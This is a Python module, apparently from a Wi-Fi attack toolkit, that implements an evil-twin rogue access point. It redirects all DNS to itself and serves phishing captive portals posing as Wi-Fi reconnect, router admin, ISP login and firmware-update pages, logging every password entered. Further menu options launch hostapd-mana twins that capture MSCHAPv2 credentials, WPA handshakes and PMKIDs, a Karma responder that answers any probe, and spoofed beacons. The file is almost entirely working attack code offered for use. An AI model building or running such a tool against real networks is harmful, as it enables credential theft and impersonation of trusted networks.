"""
Evil AP module - rogue access point + captive portal.

Two engines:
  1. hostapd/dnsmasq based (Linux, real clients can connect) with a captive
     portal that logs every credential entered.
  2. Scapy-based beacon impersonation / monitoring-only (no association).
"""
import socket
import subprocess
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

from open80211.core import ui
from open80211.core.config import CONFIG, is_linux
from open80211.core.interfaces import which
from open80211.core import netutils as nu

PORTAL_TEMPLATES = {
    "wifi-reconnect": """<!DOCTYPE html>
<html><head><title>WiFi Authentication</title>
<style>body{font-family:Arial;text-align:center;margin-top:80px}
input{padding:10px;width:260px;margin:6px}button{padding:10px 30px;background:#1a73e8;color:#fff;border:0;border-radius:6px}
h2{color:#202124}.card{max-width:380px;margin:0 auto;border:1px solid #ddd;padding:30px;border-radius:12px}
</style></head><body><div class="card">
<h2>Secure Wireless Authentication</h2>
<p>Your session has expired. Please enter your Wi-Fi password to continue.</p>
<form method="POST" action="/login">
<input type="password" name="password" placeholder="Wi-Fi Password" autofocus><br>
<input type="hidden" name="ssid" value="{ssid}">
<button type="submit">Connect</button></form>
<p style="color:#888;font-size:12px">Protected network - verify before continuing</p>
</div></body></html>""",

    "router-admin": """<!DOCTYPE html>
<html><head><title>Router Admin</title>
<style>body{font-family:Segoe UI,Arial;background:#f5f5f5;text-align:center;margin-top:60px}
.card{max-width:360px;margin:auto;background:#fff;padding:30px;border-radius:10px;box-shadow:0 2px 10px rgba(0,0,0,.1)}
input{padding:10px;width:240px;margin:6px;border:1px solid #ccc;border-radius:6px}
button{padding:10px 40px;background:#0a84ff;color:#fff;border:0;border-radius:6px}
</style></head><body><div class="card">
<h2>Router Configuration</h2>
<p>Firmware update required. Confirm your administrator password to continue.</p>
<form method="POST" action="/login">
<input type="text" name="username" placeholder="Username" value="admin"><br>
<input type="password" name="password" placeholder="Password"><br>
<input type="hidden" name="ssid" value="{ssid}">
<button type="submit">Login</button></form>
</div></body></html>""",

    "isp-login": """<!DOCTYPE html>
<html><head><title>Network Login</title>
<style>body{font-family:Arial;background:#f7f9fc;text-align:center;margin-top:70px}
.card{max-width:400px;margin:auto;background:#fff;padding:32px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,.08)}
input{padding:12px;width:280px;margin:6px;border:1px solid #ddd;border-radius:8px;font-size:15px}
button{padding:12px 50px;background:#1a73e8;color:#fff;border:0;border-radius:8px;font-size:15px;margin-top:8px}
.logo{color:#1a73e8;font-weight:bold;font-size:22px;margin-bottom:12px}
</style></head><body><div class="card">
<div class="logo">Free Wi-Fi</div>
<h3>Sign in to continue</h3>
<p>Use your provider credentials to access the internet.</p>
<form method="POST" action="/login">
<input type="text" name="username" placeholder="Username / Email"><br>
<input type="password" name="password" placeholder="Password"><br>
<input type="hidden" name="ssid" value="{ssid}">
<button type="submit">Sign In</button></form>
</div></body></html>""",

    "firmware-update": """<!DOCTYPE html>
<html><head><title>System Update</title>
<style>body{font-family:Arial;background:#eef1f5;text-align:center;margin-top:70px}
.card{max-width:400px;margin:auto;background:#fff;padding:32px;border-radius:12px}
input{padding:11px;width:270px;margin:6px;border:1px solid #ccc;border-radius:6px}
button{padding:11px 46px;background:#34a853;color:#fff;border:0;border-radius:6px}
</style></head><body><div class="card">
<h2>Important Security Update</h2>
<p>Your router requires a firmware update to patch a critical vulnerability.<br>Enter your current router password to proceed.</p>
<form method="POST" action="/login">
<input type="password" name="password" placeholder="Router Password"><br>
<input type="hidden" name="ssid" value="{ssid}">
<button type="submit">Update Now</button></form>
</div></body></html>""",
}

PORTAL_HTML = PORTAL_TEMPLATES["wifi-reconnect"]

PORTAL_SUCCESS = """<!DOCTYPE html><html><head><title>Done</title></head>
<body style="font-family:Arial;text-align:center;margin-top:100px">
<h2>Connecting...</h2><p>Please wait while your device re-associates.</p></body></html>"""


class PortalHandler(BaseHTTPRequestHandler):
    engine = None

    def log_message(self, *a):
        pass

    def do_GET(self):
        html = getattr(self.engine, "portal_html", PORTAL_HTML).format(ssid=self.engine.ssid).encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(html)))
        self.end_headers()
        self.wfile.write(html)

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0) or 0)
        body = self.rfile.read(length).decode(errors="replace")
        self.engine.capture(body, self.client_address[0])
        html = PORTAL_SUCCESS.encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(html)


class EvilAP:
    def __init__(self, iface: str, ssid: str, bssid: str = "",
                 channel: int = 6, password: str = ""):
        self.iface = iface
        self.ssid = ssid
        self.bssid = bssid or nu.int2mac(__import__("random").getrandbits(48))
        self.channel = channel
        self.password = password
        self.captures = []
        self._processes = []

    # --- hostapd + dnsmasq (real evil AP) --------------------------------

    def write_configs(self) -> tuple:
        """Write hostapd/dnsmasq configs into the session dir. Returns (hconf, dconf)."""
        hconf = CONFIG.session_dir / f"hostapd-{self.ssid}.conf"
        dconf = CONFIG.session_dir / f"dnsmasq-{self.ssid}.conf"
        wpa_line = ("wpa=2\nwpa_passphrase=" + self.password
                    if self.password else "wpa=0")
        hconf.write_text(f"""interface={self.iface}
ssid={self.ssid}
bssid={self.bssid}
hw_mode=g
channel={self.channel}
{wpa_line}
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
auth_algs=1
macaddr_acl=0
ignore_broadcast_ssid=0
""", encoding="utf-8")
        dconf.write_text(f"""interface={self.iface}
dhcp-range=192.168.100.2,192.168.100.100,255.255.255.0,12h
dhcp-option=3,192.168.100.1
dhcp-option=6,192.168.100.1
address=/#/192.168.100.1
""", encoding="utf-8")
        return hconf, dconf

    def start_hostapd(self) -> bool:
        if not which("hostapd"):
            ui.error("hostapd not found. Install: apt install hostapd")
            return False
        hconf, _ = self.write_configs()
        ui.info(f"Starting hostapd ({self.ssid})...")
        try:
            p = subprocess.Popen(["hostapd", str(hconf)],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self._processes.append(p)
            time.sleep(2)
            if p.poll() is None:
                ui.ok("Rogue AP is broadcasting.")
                return True
            ui.error("hostapd exited. Check driver support.")
            return False
        except Exception as e:
            ui.error(str(e))
            return False

    def start_dnsmasq(self) -> bool:
        if not which("dnsmasq"):
            ui.error("dnsmasq not found. Install: apt install dnsmasq")
            return False
        _, dconf = self.write_configs()
        ui.info("Starting dnsmasq (DHCP + DNS)...")
        try:
            p = subprocess.Popen(["dnsmasq", "-C", str(dconf), "--no-daemon"],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self._processes.append(p)
            time.sleep(1)
            return True
        except Exception as e:
            ui.error(str(e))
            return False

    # --- captive portal --------------------------------------------------

    def start_portal(self, port: int = 80, template: str = "") -> bool:
        PortalHandler.engine = self
        if template and template in PORTAL_TEMPLATES:
            self.portal_html = PORTAL_TEMPLATES[template]
        else:
            self.portal_html = PORTAL_HTML
        try:
            self._portal = ThreadingHTTPServer(("0.0.0.0", port), PortalHandler)
            threading.Thread(target=self._portal.serve_forever, daemon=True).start()
            ui.ok(f"Captive portal serving on :{port}")
            return True
        except Exception as e:
            ui.error(f"Portal failed: {e}")
            return False

    def capture(self, body: str, client: str):
        entry = {"time": time.time(), "client": client, "post": body}
        self.captures.append(entry)
        ui.warn(f"[PORTAL] {client} submitted: {body}")
        p = CONFIG.session_dir / "portal_credentials.log"
        with open(p, "a", encoding="utf-8") as f:
            f.write(f"{time.time()} {client} {body}\n")

    # --- PMKID / handshake capture twin --------------------------------

    def write_pmkid_twin_config(self) -> str:
        """Evil twin that also captures the WPA handshake/PMKID (mana_wpaout)."""
        hconf = CONFIG.session_dir / f"pmkidtwin-{self.ssid}.conf"
        handshake_out = CONFIG.session_dir / f"twin-{self.ssid}.handshakes"
        wpa_line = ("wpa=2\nwpa_passphrase=" + self.password
                    if self.password else "wpa=0")
        hconf.write_text(f"""interface={self.iface}
ssid={self.ssid}
bssid={self.bssid}
hw_mode=g
channel={self.channel}
{wpa_line}
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
auth_algs=1
macaddr_acl=0
ignore_broadcast_ssid=0
mana_wpaout={handshake_out}
mana_credout={CONFIG.session_dir / f'twin-{self.ssid}.creds'}
mana_pskout={CONFIG.session_dir / f'twin-{self.ssid}.psk'}
""", encoding="utf-8")
        return str(hconf)

    def start_pmkid_twin(self) -> bool:
        if not which("hostapd"):
            ui.error("hostapd not found. apt install hostapd")
            return False
        if not self.password:
            ui.warn("No passphrase set - twin will be open. Clients will not "
                    "produce a handshake. Use a WPA2 passphrase for capture.")
        hconf = self.write_pmkid_twin_config()
        ui.info("Starting PMKID-capture evil twin (hostapd-mana style)...")
        try:
            p = subprocess.Popen(["hostapd", hconf],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self._processes.append(p)
            time.sleep(2)
            if p.poll() is None:
                ui.ok(f"Twin '{self.ssid}' up. Handshake/PMKID captures "
                      f"-> results/twin-{self.ssid}.handshakes")
                return True
            ui.error("hostapd exited. Driver/AP mode unsupported?")
            return False
        except Exception as e:
            ui.error(str(e))
            return False

    # --- WPA3 / SAE downgrade info -------------------------------------

    def sae_downgrade_check(self) -> None:
        ui.section("WPA3 / SAE Downgrade", "Dragonblood check (CVE-2019-13377)")
        ui.info("""WPA3/SAE downgrade attacks:
  * If the target AP broadcasts WPA2 + WPA3 'transition mode', a rogue
    WPA2-PSK twin can downgrade clients to WPA2.
  * Dragonblood (CVE-2019-13377) lets an attacker force a password guess
    oracle via SAE commit flooding (timing / session resets).
  * Mitigation for the client: disable transition mode, patch firmware.
Launch this twin, then run Analysis -> Capture handshake against your own
BSSID to verify the downgrade path.""")

    # --- scapy impersonation fallback -----------------------------------

    def beacon_impersonate(self, duration: int = 60) -> None:
        ui.warn("Scapy beacon impersonation (no association support; "
                "use hostapd engine for a real rogue AP).")
        try:
            from scapy.all import sendp, RadioTap, Dot11, Dot11Beacon, Dot11Elt
            from open80211.core.interfaces import set_channel
            set_channel(self.iface, self.channel)
            end = time.time() + duration
            while time.time() < end:
                pkt = RadioTap() / Dot11(type=0, subtype=8,
                                         addr1="ff:ff:ff:ff:ff:ff",
                                         addr2=self.bssid, addr3=self.bssid) / \
                    Dot11Beacon(cap=0x2104) / \
                    Dot11Elt(ID=0, info=self.ssid.encode()) / \
                    Dot11Elt(ID=3, info=bytes([self.channel])) / \
                    Dot11Elt(ID=1, info=b"\x82\x84\x0b\x16")
                sendp(pkt, iface=self.iface, verbose=False)
                time.sleep(0.1)
        except KeyboardInterrupt:
            pass
        except Exception as e:
            ui.error(str(e))

    # --- enterprise / karma (hostapd-mana) ------------------------------

    def write_enterprise_configs(self) -> tuple:
        """WPA-EAP evil twin: hostapd-mana + eap_user file. Captures MSCHAPv2."""
        hconf = CONFIG.session_dir / f"mana-{self.ssid}.conf"
        econf = CONFIG.session_dir / f"mana-{self.ssid}.eap_user"
        cred_out = CONFIG.session_dir / f"mana-{self.ssid}.creds"
        econf.write_text('*        WPA-EAP  "open80211"\n', encoding="utf-8")
        handshake_out = CONFIG.session_dir / "mana-{}.handshakes".format(self.ssid)
        psk_out = CONFIG.session_dir / "mana-{}.psk".format(self.ssid)
        hconf.write_text(f"""interface={self.iface}
ssid={self.ssid}
bssid={self.bssid}
hw_mode=g
channel={self.channel}
wpa=3
wpa_key_mgmt=WPA-EAP
ieee8021x=1
eap_server=1
eap_user_file={econf}
mana_wpaout={handshake_out}
mana_eapsuccess=1
mana_credout={cred_out}
mana_pskout={psk_out}
auth_algs=1
eapol_key_index_workaround=0
""", encoding="utf-8")
        return hconf, cred_out

    def start_enterprise(self) -> bool:
        if not which("hostapd-mana") and not which("hostapd"):
            ui.error("hostapd(-mana) not found. apt install hostapd-mana")
            return False
        hconf, cred_out = self.write_enterprise_configs()
        binary = "hostapd-mana" if which("hostapd-mana") else "hostapd"
        ui.info(f"Starting WPA-EAP evil twin via {binary}...")
        try:
            p = subprocess.Popen([binary, str(hconf)],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self._processes.append(p)
            time.sleep(2)
            if p.poll() is None:
                ui.ok("Enterprise evil twin is up. Credentials -> %s" % cred_out)
                return True
            ui.error("hostapd exited. Driver/AP mode unsupported?")
            return False
        except Exception as e:
            ui.error(str(e))
            return False

    def write_karma_config(self, wpa: bool = False) -> str:
        """Karma / MANA: respond to ALL probe requests with a matching network."""
        hconf = CONFIG.session_dir / f"karma-{self.ssid}.conf"
        cred_out = CONFIG.session_dir / f"karma-{self.ssid}.creds"
        if wpa:
            pw = self.password or "open80211"
            psk_out = CONFIG.session_dir / "karma-{}.psk".format(self.ssid)
            hconf.write_text(f"""interface={self.iface}
ssid={self.ssid}
bssid={self.bssid}
hw_mode=g
channel={self.channel}
wpa=2
wpa_passphrase={pw}
wpa_key_mgmt=WPA-PSK
mana_wpa=1
mana_credout={cred_out}
mana_pskout={psk_out}
""", encoding="utf-8")
        else:
            hconf.write_text(f"""interface={self.iface}
ssid={self.ssid}
bssid={self.bssid}
hw_mode=g
channel={self.channel}
mana_open=1
mana_credout={cred_out}
""", encoding="utf-8")
        return str(hconf)

    def start_karma(self, wpa: bool = False) -> bool:
        if not which("hostapd-mana"):
            ui.error("hostapd-mana not found (Karma/MANA requires it).")
            return False
        hconf = self.write_karma_config(wpa)
        ui.info("Starting Karma/MANA responder AP...")
        try:
            p = subprocess.Popen(["hostapd-mana", hconf],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self._processes.append(p)
            time.sleep(2)
            if p.poll() is None:
                ui.ok("Karma AP broadcasting - it answers any SSID probe.")
                return True
            ui.error("hostapd-mana exited.")
            return False
        except Exception as e:
            ui.error(str(e))
            return False

    def stop(self) -> None:
        for p in self._processes:
            try:
                p.terminate()
            except Exception:
                pass
        self._processes = []
        ui.info("Evil AP stopped.")


def evil_ap_menu(iface: str) -> None:
    while True:
        choice = ui.menu("Evil AP Suite", [
            "Launch rogue AP (hostapd + dnsmasq + captive portal)",
            "Rogue AP with password (WPA2)",
            "Open rogue AP (no password)",
            "Enterprise evil twin (WPA-EAP, captures MSCHAPv2)",
            "Karma / MANA AP (answers all probes)",
            "PMKID / handshake capture twin (hostapd-mana style)",
            "WPA3 / SAE downgrade check (Dragonblood)",
            "Scapy beacon impersonation (monitor only)",
            "Show captured portal credentials",
        ])
        if choice == 0:
            return
        if not is_linux():
            ui.warn("Evil AP requires Linux + a WiFi adapter (monitor/AP mode).")
            continue
        ssid = ui.ask("SSID to broadcast")
        if not ssid:
            continue
        bssid = ui.ask("BSSID (blank = random)", default="")
        ch = ui.ask_int("Channel", default=6)
        if choice == 1:
            pw = ui.ask("WPA2 passphrase (min 8 chars)")
            if len(pw) < 8:
                ui.warn("Passphrase must be at least 8 characters.")
                continue
            ap = EvilAP(iface, ssid, bssid, ch, pw)
        elif choice == 2:
            ap = EvilAP(iface, ssid, bssid, ch)
        elif choice == 3:
            ap = EvilAP(iface, ssid, bssid, ch)
            ap.start_enterprise()
            ap.start_dnsmasq()
            ap.start_portal()
            ui.info("Press Enter to stop.")
            ui.press_enter()
            ap.stop()
            continue
        elif choice == 4:
            ap = EvilAP(iface, ssid, bssid, ch)
            wpa = ui.confirm("Karma with WPA-PSK? (else open)", default=False)
            ap.start_karma(wpa)
            ui.info("Press Enter to stop.")
            ui.press_enter()
            ap.stop()
            continue
        elif choice == 5:
            ap = EvilAP(iface, ssid, bssid, ch)
            pw = ui.ask("WPA2 passphrase (blank = open)", default="")
            ap.password = pw
            ap.start_pmkid_twin()
            ap.start_dnsmasq()
            ap.start_portal(template="wifi-reconnect")
            ui.info("Press Enter to stop the capture twin.")
            ui.press_enter()
            ap.stop()
            continue
        elif choice == 6:
            ap = EvilAP(iface, ssid, bssid, ch)
            ap.sae_downgrade_check()
            ui.info("Press Enter to continue.")
            ui.press_enter()
            continue
        elif choice == 7:
            ap = EvilAP(iface, ssid, bssid, ch)
            dur = ui.ask_int("Duration (seconds)", default=60)
            ap.beacon_impersonate(dur)
            continue
        else:
            ap = EvilAP(iface, ssid, bssid, ch)
        ap.start_hostapd()
        ap.start_dnsmasq()
        template = ui.menu("Portal template", list(PORTAL_TEMPLATES.keys()))
        if template == 0:
            template_name = "wifi-reconnect"
        else:
            template_name = list(PORTAL_TEMPLATES.keys())[template - 1]
        ap.start_portal(template=template_name)
        ui.info("Press Enter to stop the Evil AP.")
        ui.press_enter()
        ap.stop()